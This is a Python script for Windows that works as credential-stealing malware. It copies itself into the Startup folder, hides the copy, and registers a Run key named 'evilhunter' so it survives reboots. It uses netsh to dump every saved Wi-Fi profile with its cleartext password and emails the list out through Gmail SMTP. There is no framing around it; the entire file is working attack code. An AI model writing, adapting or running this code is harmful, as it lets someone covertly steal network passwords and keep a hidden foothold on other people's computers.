import smtplib
import json
import subprocess
import socket
import time
import os
import shutil
import sys
import winreg as reg  # Import winreg for registry operations
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Function to run a command and get the output
def run_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout

# Function to check for an active internet connection
def check_internet(host="8.8.8.8", port=53, timeout=5):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except socket.error as ex:
        print("No internet connection.")
        return False

# Function to move the script to the Startup folder and hide it
def move_and_hide_in_startup():
    startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    # Detect if running as an executable created by PyInstaller
    if getattr(sys, 'frozen', False):
        script_path = sys.executable  # Path to the executable
    else:
        script_path = os.path.abspath(__file__)  # Path to the script

    script_name = os.path.basename(script_path)
    destination = os.path.join(startup_dir, script_name)

    # Check if the script is already in the Startup folder
    if not os.path.exists(destination):
        # Move the script/executable to the Startup folder
        shutil.copy2(script_path, destination)
        # Hide the script/executable
        subprocess.run(f'attrib +h "{destination}"', shell=True)
        print(f"Script moved and hidden in {startup_dir}.")

        # Relaunch the script/executable from the new location
        subprocess.Popen([destination], shell=True)
        return destination  # Return the new path where the script was moved

    return None  # Indicate that the script is already in the correct location

# Function to add the script to the Windows Registry for startup
def add_to_registry(executable_path):
    key = reg.HKEY_LOCAL_MACHINE  # or reg.HKEY_LOCAL_MACHINE
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    entry_name = "evilhunter"

    try:
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, entry_name, 0, reg.REG_SZ, executable_path)
        reg.CloseKey(reg_key)
        print(f"{entry_name} added to the registry successfully!")
    except WindowsError as e:
        print(f"Failed to add {entry_name} to the registry: {e}")

# Function to send an email with the collected Wi-Fi passwords
def send_email(wifi_data_str):
    sender_email = "your-email-id"
    sender_password = "password"  # Use your App Password or regular password if 2FA is not enabled
    receiver_email = "sender-email-id"
    subject = "Wi-Fi Passwords"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(f"Here are the Wi-Fi profiles and their passwords:\n\n{wifi_data_str}", 'plain'))

    try:
        # Establish a connection to the SMTP server
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()  # Can be called explicitly, though it's implicitly called by starttls
        server.starttls()  # Upgrade the connection to a secure encrypted SSL/TLS connection
        server.ehlo()  # Called again to re-identify after starting TLS
        server.login(sender_email, sender_password)
        
        # Send the email
        server.sendmail(sender_email, receiver_email, msg.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")
    finally:
        server.quit()

# Main script logic
def main():
    moved_path = move_and_hide_in_startup()
    
    if moved_path:
        add_to_registry(moved_path)  # Use the new path for the registry entry
        sys.exit()

    while not check_internet():
        print("Waiting for internet connection...")
        time.sleep(2)

    print("Internet connection established. Proceeding...")

    profiles_output = run_command("netsh wlan show profile")
    profiles = [line.split(":")[1].strip() for line in profiles_output.splitlines() if "All User Profile" in line]

    wifi_dict = {}
    for profile in profiles:
        profile_output = run_command(f"netsh wlan show profile name=\"{profile}\" key=clear")
        password_line = [line.split(":")[1].strip() for line in profile_output.splitlines() if "Key Content" in line]
        wifi_dict[profile] = password_line[0] if password_line else "No password found"

    wifi_data_str = json.dumps(wifi_dict, indent=4)
    send_email(wifi_data_str)

if __name__ == "__main__":
    main()
